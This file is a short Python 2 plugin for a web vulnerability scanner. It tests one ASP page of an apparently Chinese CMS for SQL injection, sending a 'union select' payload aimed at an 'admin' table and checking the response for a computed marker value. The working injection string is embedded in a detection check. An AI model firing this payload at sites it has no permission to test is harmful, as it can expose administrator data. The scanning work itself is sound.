#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]
        detail=u''                            
        domain=ob['domain']
        url="2011/CompVisualizeBig.asp?id=23%20union%20select%201,888888-1,3,4,5%20from%20admin"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)        
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        try:
            content=content.decode('gb2312').encode('utf8')
        except UnicodeDecodeError:
            return result
        if content.find("888887")>=0 and response['status']=="200":
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,ob['scheme']+"://"+domain,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:guanlongsqlinjdectionscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:guanlongsqlinjdectionscript.py, run_domain function :" + str(e))
    return result